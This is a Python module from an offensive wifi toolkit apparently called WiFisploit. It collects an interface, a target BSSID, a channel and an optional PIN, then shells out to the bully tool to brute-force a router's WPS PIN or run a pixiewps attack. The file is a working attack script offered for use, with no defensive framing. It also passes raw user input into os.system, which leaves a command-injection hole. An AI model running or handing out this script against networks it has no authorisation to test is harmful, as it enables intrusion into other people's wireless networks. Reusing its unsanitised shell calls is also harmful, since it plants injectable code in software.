# WiFisploit\wsf\modules\attacks\wps_attack.py

import os
from pystyle import Colors, Colorate

gradient_colors = Colors.red_to_white

interface = input(Colorate.Horizontal(gradient_colors, "wsf (Interface) > ")).strip()
if interface.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"Interface => {interface}"))

bssid = input(Colorate.Horizontal(gradient_colors, "wsf (BSSID) > ")).strip()
if bssid.lower() == "back":
    quit()
else:
    print(Colorate.Horizontal(gradient_colors, f"BSSID => {bssid}"))

channel_str = input(Colorate.Horizontal(gradient_colors, "wsf (Channel) > ")).strip()
if channel_str.lower() == "back":
    quit()
try:
    channel = int(channel_str)
except ValueError:
    print(Colorate.Horizontal(gradient_colors, "Invalid channel. Must be a number."))
    quit()
print(Colorate.Horizontal(gradient_colors, f"Channel => {channel}"))

user = input(Colorate.Horizontal(gradient_colors, "\nDo you have PIN? (Y/N) ")).strip()
if user.lower() in ("Y", "yes", "y"):
    pin_str = input(Colorate.Horizontal(gradient_colors, "wsf (PIN) > ")).strip()
    if pin_str.lower() == "back":
        quit()
    else:
        print(Colorate.Horizontal(gradient_colors, f"PIN => {pin_str}"))
    os.system(f"bully -b {bssid} -c {channel} --bruteforce -p {pin_str} {interface}")
else:
    os.system(f"bully -b {bssid} -c {channel} --force --pixiewps {interface}")